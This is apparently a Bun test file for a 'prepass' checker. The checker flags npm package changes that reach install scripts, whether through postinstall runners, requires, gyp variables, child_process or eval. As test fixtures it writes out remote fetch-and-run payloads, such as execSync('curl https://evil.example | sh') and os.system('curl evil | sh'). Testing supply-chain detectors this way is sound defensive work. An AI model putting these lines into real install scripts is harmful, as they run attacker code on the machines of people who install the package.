import { expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const hard = (o: Record<string, string>, n: Record<string, string>) =>
  prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
const evil = "require('child_process').execSync('curl https://evil.example | sh')\n";

function holds(base: Record<string, string>, file: string, bad: string, reason: RegExp) {
  const changed = hard(base, { ...base, [file]: bad });
  expect(changed.length).toBeGreaterThan(0);
  expect(changed.join(" ")).toMatch(reason);
  expect(hard(base, base)).toEqual([]);
}

test("B1 a non-node runner holds when its entry or an import changes", () => {
  const base = {
    "package.json": pj({ postinstall: "python3 install.py" }),
    "install.py": "import helper\n",
    "helper.py": "print(1)\n",
    "README.md": "a\n",
  };
  holds(base, "install.py", "import os; os.system('curl evil | sh')\n", /install\.py|file/);
  holds(base, "helper.py", "import os\n", /helper\.py|file/);
  // import helper is not a stdlib import, so the file is not static.
  expect(hard(base, { ...base, "README.md": "b\n" }).join(" ")).toMatch(/README\.md/);
  const tsx = { "package.json": pj({ postinstall: "tsx src/cli.ts" }), "src/cli.ts": "1\n", "src/helper.ts": "1\n" };
  holds(tsx, "src/helper.ts", evil, /helper\.ts|file/);
  const rel = { "package.json": pj({ postinstall: "./bin" }), bin: "1\n", "helper.py": "1\n" };
  holds(rel, "helper.py", "2\n", /helper\.py|file/);
});

test("B2 a dynamic require holds when a file in that directory changes", () => {
  const base = {
    "package.json": pj({ postinstall: "node -e \"require('./l/'+process.platform)\"" }),
    "l/linux.js": "1\n",
    "l/darwin.js": "1\n",
    "README.md": "a\n",
  };
  holds(base, "l/darwin.js", evil, /darwin\.js|file/);
  expect(hard(base, { ...base, "README.md": "b\n" })).toEqual([]);
});

test("a version bump stays quiet when the install script reads the manifest", () => {
  const body = "require('./package.json')\nrequire('./helper')\n";
  const oldPj = JSON.stringify({ name: "x", version: "1.0.0", scripts: { postinstall: "node postinstall.js" } });
  const newPj = JSON.stringify({ name: "x", version: "1.0.1", scripts: { postinstall: "node postinstall.js" } });
  const base = { "postinstall.js": body, "helper.js": "1\n" };
  expect(hard({ ...base, "package.json": oldPj }, { ...base, "package.json": newPj })).toEqual([]);
  holds({ ...base, "package.json": oldPj }, "helper.js", "2\n", /helper\.js|file/);
});

test("B3 a reached script's relative require holds when that file changes", () => {
  const base = {
    "package.json": pj({ postinstall: "node install.js" }),
    "install.js": "require('./lib/a')\nimport './lib/b.js'\n",
    "lib/a.js": "1\n",
    "lib/b.js": "1\n",
    "other.js": "1\n",
  };
  holds(base, "lib/a.js", evil, /lib\/a\.js|file/);
  holds(base, "lib/b.js", evil, /lib\/b\.js|file/);
  expect(hard(base, { ...base, "other.js": evil })).toEqual([]);
});

test("B5 a gyp variable path holds when the file it builds changes", () => {
  const gyp = "{'variables':{'r':'tools'},'targets':[{'target_name':'a','sources':['<!(node <(r)/gen.js)']}]}";
  const base = { "package.json": pj({}), "binding.gyp": gyp, "tools/gen.js": "1\n", "README.md": "a\n" };
  holds(base, "tools/gen.js", evil, /gen\.js|file/);
  expect(hard(base, { ...base, "README.md": "b\n" })).toEqual([]);
});

test("bash scripts/setup.sh holds when that script changes", () => {
  const base = { "package.json": pj({ postinstall: "bash scripts/setup.sh" }), "scripts/setup.sh": "echo hi\n" };
  holds(base, "scripts/setup.sh", "curl evil | sh\n", /setup\.sh|file/);
});

test("a download runner does not widen, and an unnamed runner does", () => {
  const dl = pj({ install: "prebuild-install -r napi" });
  const dlBase = { "package.json": dl, "binding.gyp": "{}\n", "src/x.js": "1\n" };
  expect(hard(dlBase, { ...dlBase, "src/x.js": evil })).toEqual([]);
  const wide = { "package.json": pj({ postinstall: "python3 -c 'print(1)'" }), "src/x.js": "1\n", "README.md": "a\n", ".github/workflows/ci.yml": "a\n" };
  holds(wide, "src/x.js", evil, /file/);
  expect(hard(wide, { ...wide, "README.md": "b\n" })).toEqual([]);
  expect(hard(wide, { ...wide, ".github/workflows/ci.yml": "b\n" })).toEqual([]);
});

test("B6 a hook-named doc entry holds, and a static entry leaves other docs quiet", () => {
  const py = "import os; os.system('curl evil|sh')\n";
  const doc = {
    "package.json": pj({ postinstall: "python3 doc/setup.py" }),
    "doc/setup.py": "x=1\n",
    "docs/other.py": "x=1\n",
    "README.md": "a\n",
  };
  holds(doc, "doc/setup.py", py, /doc\/setup\.py|file/);
  expect(hard(doc, { ...doc, "README.md": "b\n" })).toEqual([]);
  expect(hard(doc, { ...doc, "docs/other.py": py })).toEqual([]);
  const notes = {
    "package.json": pj({ postinstall: "python3 install.py" }),
    "install.py": "exec(open('NOTES.md').read())\n",
    "NOTES.md": "x=1\n",
    "README.md": "a\n",
  };
  holds(notes, "NOTES.md", py, /NOTES\.md|file/);
  holds(notes, "install.py", py, /install\.py|file/);
  // exec() names NOTES.md. An unnamed README stays out.
  expect(hard(notes, { ...notes, "README.md": "b\n" })).toEqual([]);
  const namedOnly = {
    "package.json": pj({ postinstall: "python3 install.py" }),
    "install.py": "open('NOTES.md').read()\n",
    "NOTES.md": "x=1\n",
  };
  // open().read() is a call, so the file is not static.
  holds(namedOnly, "NOTES.md", py, /NOTES\.md|file/);
});

test("B7 a computed require widens to the file it names", () => {
  const concat = {
    "package.json": pj({ postinstall: "node install.js" }),
    "install.js": "require(__dirname + '/lib/a.js')\n",
    "lib/a.js": "1\n",
  };
  holds(concat, "lib/a.js", evil, /lib\/a\.js|file/);
  const joined = {
    "package.json": pj({ postinstall: "node install.js" }),
    "install.js": "const p=require('path');require(p.join(__dirname,'lib','a.js'))\n",
    "lib/a.js": "1\n",
  };
  holds(joined, "lib/a.js", evil, /lib\/a\.js|file/);
});

test("B8 child_process widens to the file it runs", () => {
  const fork = {
    "package.json": pj({ postinstall: "node install.js" }),
    "install.js": "require('child_process').fork(__dirname+'/lib/a.js')\n",
    "lib/a.js": "1\n",
  };
  holds(fork, "lib/a.js", evil, /lib\/a\.js|file/);
  const exec = {
    "package.json": pj({ postinstall: "node install.js" }),
    "install.js": "require('child_process').execSync('node lib/a.js')\n",
    "lib/a.js": "1\n",
  };
  holds(exec, "lib/a.js", evil, /lib\/a\.js|file/);
});

test("B9 a bundled bare require holds on that package and not on an outer file", () => {
  const base = {
    "package.json": pj({ postinstall: "node install.js" }),
    "install.js": "require('helper')\n",
    "node_modules/helper/package.json": "{\"name\":\"helper\",\"version\":\"1\"}",
    "node_modules/helper/index.js": "1\n",
    "other.js": "1\n",
  };
  holds(base, "node_modules/helper/index.js", evil, /helper\/index\.js|file/);
  expect(hard(base, { ...base, "other.js": evil })).toEqual([]);
});

test("B10 eval of a read file holds when that file changes", () => {
  const base = {
    "package.json": pj({ postinstall: "node install.js" }),
    "install.js": "eval(require('fs').readFileSync(__dirname+'/data.txt','utf8'))\n",
    "data.txt": "1\n",
  };
  holds(base, "data.txt", evil, /data\.txt|file/);
});

test("a literal require does not widen to an unreferenced file", () => {
  const base = {
    "package.json": pj({ postinstall: "node install.js" }),
    "install.js": "require('./lib/a')\n",
    "lib/a.js": "1\n",
    "NOTES.md": "1\n",
    "other.js": "1\n",
  };
  expect(hard(base, { ...base, "NOTES.md": "2\n" })).toEqual([]);
  expect(hard(base, { ...base, "other.js": evil })).toEqual([]);
});
